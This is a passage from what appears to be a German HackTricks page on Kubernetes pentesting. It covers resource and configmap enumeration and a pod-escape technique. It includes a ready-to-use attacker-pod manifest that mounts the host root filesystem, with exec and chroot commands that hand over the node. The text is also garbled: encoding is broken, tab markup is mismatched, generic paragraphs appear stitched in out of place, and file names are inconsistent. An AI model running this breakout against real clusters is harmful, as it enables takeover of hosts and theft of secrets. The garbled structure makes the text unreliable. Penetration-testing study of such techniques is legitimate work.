Aktivieren Sie die √úberwachung und Protokollierung von Kubernetes-Audit-Logs, um verd√§chtige Aktivit√§ten zu erkennen und Sicherheitsvorf√§lle zu untersuchen.

#### Kubernetes-Dashboard

√úberpr√ºfen Sie, ob das Kubernetes-Dashboard aktiviert ist und ob es angemessen gesichert ist, um unbefugten Zugriff zu verhindern.

#### Helm-Charts

√úberpr√ºfen Sie die Sicherheit von Helm-Charts, die zur Bereitstellung von Anwendungen in Kubernetes verwendet werden, um sicherzustellen, dass keine bekannten Sicherheitsl√ºcken vorhanden sind.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Erhalten Sie Cronjob

Cron-Jobs erm√∂glichen es, mit einer crontab-√§hnlichen Syntax die Planung des Starts eines Pods zu planen, der eine bestimmte Aktion ausf√ºhrt.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes API-Enumeration

#### Kubernetes API-Server

Der Kubernetes-API-Server ist das zentrale Gateway f√ºr die gesamte Kubernetes-Steuerungsebene. Es ist wichtig, den API-Server zu enumerieren, um Informationen √ºber verf√ºgbare Endpunkte, Versionen und Konfigurationen zu sammeln.

##### Schritte zur API-Enumeration:

1. **API-Endpunkte erkunden:** Durchsuchen Sie die verf√ºgbaren API-Endpunkte, um Informationen √ºber Ressourcen und Berechtigungen zu sammeln.
   
2. **API-Versionen √ºberpr√ºfen:** Ermitteln Sie die unterst√ºtzten API-Versionen, um Schwachstellen oder veraltete Versionen zu identifizieren.
   
3. **Authentifizierungsmethoden √ºberpr√ºfen:** Untersuchen Sie die verf√ºgbaren Authentifizierungsmethoden, um potenzielle Schwachstellen zu erkennen.
   
4. **Zugriffssteuerungsrichtlinien (Access Control Policies, ACP) √ºberpr√ºfen:** Analysieren Sie die ACPs, um Berechtigungen und Zugriffsbeschr√§nkungen zu verstehen.

Die API-Enumeration ist ein wichtiger Schritt beim Testen der Sicherheit von Kubernetes-Clustern, da sie Einblicke in potenzielle Angriffsvektoren und Schwachstellen bietet.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### ConfigMap abrufen

configMap enth√§lt immer viele Informationen und Konfigurationsdateien, die den in Kubernetes ausgef√ºhrten Apps bereitgestellt werden. Normalerweise finden Sie viele Passw√∂rter, Geheimnisse und Tokens, die zur Verbindung und Validierung mit anderen internen/externen Diensten verwendet werden.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes API-Enumeration

#### Kubernetes API-Server-Enumeration

Die Kubernetes-API kann √ºber den Endpunkt `/api` oder `/apis` abgefragt werden. Dies kann verwendet werden, um verf√ºgbare API-Gruppen und -Versionen zu ermitteln.

```bash
curl <kubernetes-api-server>/api
curl <kubernetes-api-server>/apis
```

#### Kubernetes-Ressourcen-Enumeration

Die verf√ºgbaren Ressourcen k√∂nnen √ºber die API abgefragt werden, um Informationen √ºber die vom Cluster unterst√ºtzten Ressourcentypen zu erhalten.

```bash
curl <kubernetes-api-server>/apis/<group>/<version>
curl <kubernetes-api-server>/apis/<group>/<version>/<resource>
```

#### Kubernetes-Namespaces-Enumeration

Die Namespaces k√∂nnen √ºber die API abgefragt werden, um Informationen √ºber die im Cluster vorhandenen Namespaces zu erhalten.

```bash
curl <kubernetes-api-server>/api/v1/namespaces
```

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Erhalten Sie "alle"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pod-Verbrauch erhalten**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Entkommen aus dem Pod

Wenn Sie in der Lage sind, neue Pods zu erstellen, k√∂nnten Sie in der Lage sein, aus ihnen auf den Knoten zu entkommen. Um dies zu tun, m√ºssen Sie einen neuen Pod mithilfe einer YAML-Datei erstellen, zum erstellten Pod wechseln und dann in das System des Knotens chrooten. Sie k√∂nnen bereits vorhandene Pods als Referenz f√ºr die YAML-Datei verwenden, da sie vorhandene Bilder und Pfade anzeigen.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Wenn Sie einen Pod auf einem bestimmten Knoten erstellen m√ºssen, k√∂nnen Sie den folgenden Befehl verwenden, um die Labels auf dem Knoten zu erhalten
>
> `k get nodes --show-labels`
>
> √úblicherweise sind kubernetes.io/hostname und node-role.kubernetes.io/master alle gute Labels zur Auswahl.
>
> [Referenz]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Dann erstellen Sie Ihre attack.yaml Datei
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Nachdem Sie das getan haben, erstellen Sie das Pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Jetzt k√∂nnen Sie zum erstellten Pod wie folgt wechseln:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Und schlie√ülich chrooten Sie in das System des Knotens.
```bash
chroot /root /bin/bash
```
Informationen erhalten von: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Teil 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Angriff und Verteidigung von Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referenzen

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS-Hacking: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
{% endhint %}
